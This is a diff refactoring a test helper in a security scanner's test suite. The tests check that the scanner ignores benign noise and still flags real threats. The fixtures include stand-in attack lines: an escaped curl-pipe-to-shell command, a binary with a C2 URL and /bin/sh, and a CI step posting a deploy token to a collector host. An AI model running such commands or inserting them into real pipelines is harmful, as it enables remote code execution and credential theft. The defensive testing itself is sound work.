@@ -28,12 +28,16 @@ from cordon_scanner.detect.secrets import NOT_A_SECRET, PLACEHOLDER
 from support import Support
 
 
-def flagged(root) -> set[str]:
-    return {
-        f.rule_id
-        for f in Scanner().scan(root).findings
-        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
-    }
+class EnterpriseNoiseHelpers:
+    """Helpers for test_enterprise_noise.py."""
+
+    @staticmethod
+    def flagged(root) -> set[str]:
+        return {
+            f.rule_id
+            for f in Scanner().scan(root).findings
+            if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
+        }
 
 
 class TestCharactersThatDoNotReorderText:
@@ -62,7 +66,7 @@ class TestCharactersThatDoNotReorderText:
         by a reviewer."""
         catalogue = tmp_path / "django.po"
         catalogue.write_text(f'msgid "x"\nmsgstr "{chr(0x202B)}text"\n', encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.BIDI.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
 
 class TestPublicMaterialIsNotSecret:
@@ -73,7 +77,7 @@ class TestPublicMaterialIsNotSecret:
         (tmp_path / "Certs.java").write_text(
             f'String cert = "{header}\\n" + "MIIBkTCB+wIJAKt...";\n', encoding="utf-8"
         )
-        assert flagged(tmp_path) == set()
+        assert EnterpriseNoiseHelpers.flagged(tmp_path) == set()
 
     def test_a_private_key_still_is(self, tmp_path) -> None:
         header = Support.assemble("-----BEGIN ", "PRIVATE KEY", "-----")
@@ -82,7 +86,7 @@ class TestPublicMaterialIsNotSecret:
         )
         # Reported by the provider rule, which names it, rather than the
         # generic one.
-        assert "SECRET.PRIVATE_KEY.001" in flagged(tmp_path)
+        assert "SECRET.PRIVATE_KEY.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
 
 class TestIdentifiersAndPaths:
@@ -139,7 +143,7 @@ class TestGeneratedAssets:
         target.parent.mkdir(parents=True, exist_ok=True)
         blob = Support.assemble("kR9mT2nQ8vL4xW7yZ3bC", "6dF1gH5jK0pS9rT2") * 200
         target.write_text(blob + "\n", encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_a_data_file_with_no_language_is_not_source(self, tmp_path) -> None:
         """The rule's own docstring said "source-shaped files only" and never
@@ -147,7 +151,7 @@ class TestGeneratedAssets:
         line in data is what data looks like."""
         blob = Support.assemble("kR9mT2nQ8vL4xW7yZ3bC", "6dF1gH5jK0pS9rT2") * 200
         (tmp_path / "GeoLite2.mmdb").write_text(blob + "\n", encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
 
 class TestUnicodeTablesAreData:
@@ -158,12 +162,12 @@ class TestUnicodeTablesAreData:
         to the split-across-the-file branch."""
         table = "".join(f"\\\\u0A{i:02X}" for i in range(0x10, 0x60))
         (tmp_path / "ranges.js").write_text(f'const gurmukhi = "{table}";\n', encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.ENCODED.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.ENCODED.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_a_concealed_ascii_payload_still_fires(self, tmp_path) -> None:
         hidden = "".join(f"\\\\x{ord(c):02x}" for c in "curl http://x.invalid|sh")
         (tmp_path / "loader.js").write_text(f'const c = "{hidden}";\n', encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.ENCODED.001" in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.ENCODED.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
 
 class TestBinaryStrings:
@@ -174,13 +178,13 @@ class TestBinaryStrings:
         (tmp_path / "django.mo").write_bytes(
             b"\xde\x12\x04\x95" + b"\x00" * 40 + b"https://www.djangoproject.com\x00" + b"\x00" * 40
         )
-        assert "SUSPECT.BINARY.STRINGS.001" not in flagged(tmp_path)
+        assert "SUSPECT.BINARY.STRINGS.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_a_url_and_a_shell_command_together_are(self, tmp_path) -> None:
         (tmp_path / "blob").write_bytes(
             b"\x00\x01\x02\x03" * 8 + b"https://c2.invalid/x\x00/bin/sh\x00" + b"\x00" * 32
         )
-        assert "SUSPECT.BINARY.STRINGS.001" in flagged(tmp_path)
+        assert "SUSPECT.BINARY.STRINGS.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_the_command_pattern_matches_between_nul_bytes(self) -> None:
         """A leading `\\b` needs a word character beside it, and in a binary
@@ -319,12 +323,12 @@ class TestScopeResolutionIsNotAssignment:
     )
     def test_a_scoped_enum_member_is_not_a_credential(self, tmp_path, line: str) -> None:
         (tmp_path / "a.cc").write_text(f"switch (t) {{\n  {line}\n}}\n", encoding="utf-8")
-        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_a_single_colon_still_assigns(self, tmp_path) -> None:
         value = Support.assemble("hunter2", "Sup3r", "SecretV")
         (tmp_path / "a.yml").write_text(f'password: "{value}"\n', encoding="utf-8")
-        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
 
 class TestValuesThatNameSomethingElse:
@@ -463,14 +467,14 @@ class TestLinesThatAreLongBecauseSomethingGeneratedThem:
             f"// Code generated by protoc-gen-go. DO NOT EDIT.\nconst t = '{self.LONG}';\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_an_inline_source_map_is_a_comment(self, tmp_path) -> None:
         (tmp_path / "a.js").write_text(
             f"const a = 1;\n//# sourceMappingURL=data:application/json;base64,{self.LONG}\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
         "path",
@@ -487,11 +491,11 @@ class TestLinesThatAreLongBecauseSomethingGeneratedThem:
         target = tmp_path / path
         target.parent.mkdir(parents=True, exist_ok=True)
         target.write_text(f"const t = '{self.LONG}';\n", encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_a_long_line_in_ordinary_source_still_is(self, tmp_path) -> None:
         (tmp_path / "a.js").write_text(f"const t = '{self.LONG}';\n", encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
 
 class TestUrlsThatCarryNoCredential:
@@ -520,24 +524,24 @@ class TestUrlsThatCarryNoCredential:
         requires a URL with basic auth in it."""
         url = Support.assemble("http://usr:", "aB3xQ9zK", "@", host, "/db")
         (tmp_path / "a.js").write_text(f"const u = '{url}';\n", encoding="utf-8")
-        assert "SECRET.URL.CREDENTIAL.001" not in flagged(tmp_path)
+        assert "SECRET.URL.CREDENTIAL.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_a_real_host_still_is(self, tmp_path) -> None:
         url = Support.assemble("postgres://usr:", "aB3xQ9zK", "@db.internal.corp:5432/main")
         (tmp_path / "a.js").write_text(f"const u = '{url}';\n", encoding="utf-8")
-        assert "SECRET.URL.CREDENTIAL.001" in flagged(tmp_path)
+        assert "SECRET.URL.CREDENTIAL.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_a_private_address_is_not_treated_as_documentation(self, tmp_path) -> None:
         """A credential for 10.0.0.5 is a credential for something real."""
         url = Support.assemble("postgres://usr:", "aB3xQ9zK", "@10.0.0.5:5432/main")
         (tmp_path / "a.js").write_text(f"const u = '{url}';\n", encoding="utf-8")
-        assert "SECRET.URL.CREDENTIAL.001" in flagged(tmp_path)
+        assert "SECRET.URL.CREDENTIAL.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize("word", ["strongpassword", "urlpass", "supersecret"])
     def test_a_single_case_word_is_what_documentation_writes(self, tmp_path, word: str) -> None:
         url = Support.assemble("https://sql_user:", word, "@some.server:9200")
         (tmp_path / "a.md").write_text(f"    $ ./bin/cli {url}\n", encoding="utf-8")
-        assert "SECRET.URL.CREDENTIAL.001" not in flagged(tmp_path)
+        assert "SECRET.URL.CREDENTIAL.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
 
 class TestEscapesAnEncoderWrote:
@@ -547,19 +551,19 @@ class TestEscapesAnEncoderWrote:
         a long run of escapes decoding to three characters."""
         entries = ",\n".join(f'    {{"name": "Annotations \\u0026 Alerts {n}"}}' for n in range(40))
         (tmp_path / "dash.json").write_text(f"[\n{entries}\n]\n", encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.ENCODED.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.ENCODED.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_a_repeated_escape_in_a_test_is_not_either(self, tmp_path) -> None:
         cases = "\n".join(f'    {{ code: "let {{\\\\u0061: a{n}}} = obj;" }},' for n in range(30))
         (tmp_path / "rule.test.js").write_text(f"const t = [\n{cases}\n];\n", encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.ENCODED.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.ENCODED.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_text_written_as_escapes_still_is(self, tmp_path) -> None:
         """Concealment decodes to something somebody typed, and that has
         variety."""
         hidden = "".join(f"\\u{ord(c):04x}" for c in "https://collect.example.invalid/beacon")
         (tmp_path / "a.js").write_text(f'const u = "{hidden}";\n', encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.ENCODED.001" in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.ENCODED.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
 
 class TestTheRemediationIsNotTheFinding:
@@ -598,7 +602,7 @@ class TestTheRemediationIsNotTheFinding:
             ]
         )
         target.write_bytes(body.encode("utf-8"))
-        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" not in flagged(tmp_path)
+        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
         "line",
@@ -611,7 +615,7 @@ class TestTheRemediationIsNotTheFinding:
         target = tmp_path / ".github" / "workflows" / "ci.yml"
         target.parent.mkdir(parents=True)
         target.write_text(f"jobs:\n  check:\n    steps:\n{line}\n", encoding="utf-8")
-        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" in flagged(tmp_path)
+        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
         "line",
@@ -643,7 +647,7 @@ class TestTheRemediationIsNotTheFinding:
             f"jobs:\n  check:\n    steps:\n      - uses: some/action@v1\n        with:\n{line}\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" not in flagged(tmp_path)
+        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" not in EnterpriseNoiseHelpers.flagged(tmp_path)
 
 
 class TestPublishingIsNotExfiltration:
@@ -668,7 +672,7 @@ class TestPublishingIsNotExfiltration:
         )
         found = [f for f in Scanner().scan(root).findings if f.rule_id.startswith("MALWARE.CI")]
         assert not found, "publishing with your own credential is not malware"
-        assert "SUSPECT.CI.SECRET_EGRESS.001" in flagged(root)
+        assert "SUSPECT.CI.SECRET_EGRESS.001" in EnterpriseNoiseHelpers.flagged(root)
 
     def test_the_whole_secret_context_still_is(self, tmp_path) -> None:
         """Serialising every secret the job can reach into one string is not
@@ -687,7 +691,7 @@ class TestPublishingIsNotExfiltration:
         root = self.workflow(
             tmp_path, "jobs:\n  publish:\n    steps:\n      - run: echo '${{ secrets }}'\n"
         )
-        assert "MALWARE.CI.SECRET_EXFIL.001" in flagged(root)
+        assert "MALWARE.CI.SECRET_EXFIL.001" in EnterpriseNoiseHelpers.flagged(root)
 
     def test_other_ci_systems_are_covered_by_the_same_rule(self, tmp_path) -> None:
         (tmp_path / ".gitlab-ci.yml").write_text(
@@ -695,7 +699,7 @@ class TestPublishingIsNotExfiltration:
             '    - curl -X POST -d "token=$DEPLOY_TOKEN" https://collector.invalid/i\n',
             encoding="utf-8",
         )
-        assert "SUSPECT.CI.SECRET_EGRESS.001" in flagged(tmp_path)
+        assert "SUSPECT.CI.SECRET_EGRESS.001" in EnterpriseNoiseHelpers.flagged(tmp_path)
 
     def test_a_secret_with_no_network_call_nearby_is_silent(self, tmp_path) -> None:
         root = self.workflow(
@@ -703,4 +707,4 @@ class TestPublishingIsNotExfiltration:
             "jobs:\n  build:\n    steps:\n      - run: npm ci\n        env:\n"
             "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n",
         )
-        assert "SUSPECT.CI.SECRET_EGRESS.001" not in flagged(root)
+        assert "SUSPECT.CI.SECRET_EGRESS.001" not in EnterpriseNoiseHelpers.flagged(root)
